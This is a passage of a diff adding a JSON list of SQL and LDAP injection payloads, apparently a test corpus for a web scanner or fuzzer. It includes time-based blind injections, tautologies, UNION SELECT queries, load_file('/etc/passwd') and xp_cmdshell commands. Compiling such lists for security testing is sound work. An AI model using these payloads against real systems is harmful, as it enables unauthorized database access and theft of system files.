@@ -1,0 +1,2690 @@
+[
+  {
+    "payload_type": "0",
+    "payload_text": "sleep(__TIME__)#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1 or sleep(__TIME__)#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\" or sleep(__TIME__)#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or sleep(__TIME__)#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\" or sleep(__TIME__)=\"",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or sleep(__TIME__)='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1) or sleep(__TIME__)#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\") or sleep(__TIME__)=\"",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "') or sleep(__TIME__)='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1)) or sleep(__TIME__)#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\")) or sleep(__TIME__)=\"",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "')) or sleep(__TIME__)='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ";waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ");waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "';waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\";waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "');waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\");waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "));waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "'));waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\"));waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1 or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\" or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1) or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\") or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "') or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1)) or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\")) or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "')) or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ")%20or%20('x'='x",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "%20or%201=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "; execute immediate 'sel' || 'ect us' || 'er'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "update",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\";waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1) or pg_sleep(__TIME__)--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "||(elt(-3+5,bin(15),ord(10),hex(char(45))))",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "hi\"\"\"\") or (\"\"\"\"a\"\"\"\"=\"\"\"\"a\"\"\"",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "delete",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "like",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\" or sleep(__TIME__)#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "pg_sleep(__TIME__)--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "*(|(objectclass=*))",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "declare @q nvarchar (200) 0x730065006c00650063 ...",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 0=0 #",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "insert",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1) or sleep(__TIME__)#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ") or ('a'='a",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "; exec xp_regread",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "*|",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "@var select @var as var into temp end --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1)) or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "asc",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "(||6)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "a\"\"\"\" or 3=3--\"\"\"",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\" or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "# from wapiti",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 0=0 --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1 waitfor delay '0:0:10'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 'a'='a",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "hi or 1=1 --\"",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "or a = a",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " UNION ALL SELECT",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ") or sleep(__TIME__)='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ")) or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "hi' or 'a'='a",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "0",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "21%",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "limit",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 1=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 2 > 1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\")) or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "PRINT",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "hi') or ('a'='a",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 3=3",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "));waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "a' waitfor delay '0:0:10'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1;(load_file(char(47,101,116,99,47,112,97,115, ...",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "or%201=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1 or sleep(__TIME__)#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "or 1=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " and 1 in (select var from temp)--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or '7659'='7659",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 'text' = n'text'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 1=1 or ''='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "declare @s varchar (200) select @s = 0x73656c6 ...",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "exec xp",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "; exec master..xp_cmdshell 'ping 172.10.1.255'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "3.10E+17",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or pg_sleep(__TIME__)--\"",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "x' AND email IS NULL; --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "&",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "admin' or '",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 'unusual' = 'unusual'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "//",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "truncate",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1) or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\\x27UNION SELECT",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "declare @s varchar(200) select @s = 0x77616974 ...",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "tz_offset",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "sqlvuln",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\"));waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "||6",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "or%201=1 --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "%2A%28%7C%28objectclass%3D%2A%29%29",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "or a=a",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ") union select * from information_schema.tables;",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "PRINT @@variable",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "or isNULL(1/0) /*",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "26 %",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or \"\"a\"\"=\"\"a\"",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "(sqlvuln)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "x' AND members.email IS NULL; --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 1=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " and 1=( if((load_file(char(110,46,101,120,11 ...",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "0x770061006900740066006F0072002000640065006C00 ...",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "%20'sleep%2050'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "as",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1)) or pg_sleep(__TIME__)--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "/**/or/**/1/**/=/**/1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " union all select @@version--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ",@variable",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "(sqlattempt2)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or (EXISTS)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "t'exec master..xp_cmdshell 'nslookup www.googl ...",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "%20$(sleep%2050)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1 or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "%20or%20''='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "||UTL_HTTP.REQUEST",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or pg_sleep(__TIME__)--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "hi' or 'x'='x';",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ") or sleep(__TIME__)=",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 'whatever' in ('whatever')",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "; begin declare @var varchar(8000) set @var=' ...",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " union select 1,load_file('/etc/passwd'),1,1,1;",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "0x77616974666F722064656C61792027303A303A313027 ...",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "exec(@s)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ") or pg_sleep(__TIME__)--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " union select",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or sleep(__TIME__)#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " select * from information_schema.tables--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "a' or 1=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "a' or 'a' = 'a",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "declare @s varchar(22) select @s =",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 2 between 1 and 3",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or a=a--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or '1'='1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "|",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or sleep(__TIME__)='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 1 --'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "or 0=0 #\"",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "having",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "a'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\" or isNULL(1/0) /*",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "declare @s varchar (8000) select @s = 0x73656c ...",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "â or 1=1 --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "char%4039%41%2b%40SELECT",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "order by",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "bfilename",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " having 1=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ") or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or username like char(37);",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ";waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 1=1--\"",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "x' AND userid IS NULL; --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "*/*",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 'text' > 't'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " (select top 1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or benchmark(10000000,MD5(1))#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\");waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "a' or 3=3--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " -- &password=",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " group by userid having 1=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or ''='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "; exec master..xp_cmdshell",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "%20or%20x=x",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "select",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ")) or sleep(__TIME__)=\"\"\"",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "0x730065006c0065006300740020004000400076006500 ...",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "hi' or 1=1 --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\") or pg_sleep(__TIME__)--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "%20or%20'x'='x",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 'something' = 'some'+'thing'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "exec sp",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "29 %",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "(",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "Ã½ or 1=1 --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1 or pg_sleep(__TIME__)--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "0 or 1=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ") or (a=a",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "uni/**/on sel/**/ect",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "replace",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "%27%20or%201=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ")) or pg_sleep(__TIME__)--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "%7C",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "x' AND 1=(SELECT COUNT(*) FROM tabname); --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "&apos;%20OR",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "; or '1'='1'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "declare @q nvarchar (200) select @q = 0x770061 ...",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1 or 1=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "; exec ('sel' + 'ect us' + 'er')",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "23 OR 1=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "anything' OR 'x'='x",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "declare @q nvarchar (4000) select @q =",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "or 0=0 --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "desc",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "||'6",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ")",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1)) or sleep(__TIME__)#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "or 0=0 #",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " select name from syscolumns where id = (sele ...",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "hi or a=a",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "*(|(mail=*))",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "password:*/=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "distinct",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ");waitfor delay '0:0:__TIME__'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "to_timestamp_tz",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ") or benchmark(10000000,MD5(1))#\"",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "%2A%28%7C%28mail%3D%2A%29%29",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "#NAME?",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 1=1 /*",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": ")) or sleep(__TIME__)='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "or 1=1 or \"\"=",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 1 in (select @@version)--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "sqlvuln;",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " union select * from users where login = char ...",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "x' or 1=1 or 'x'='y",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "28%",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "â or 3=3 --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "@variable",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or '1'='1'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "a\" or 1=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "//*",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "%2A%7C",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\" or 0=0 --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
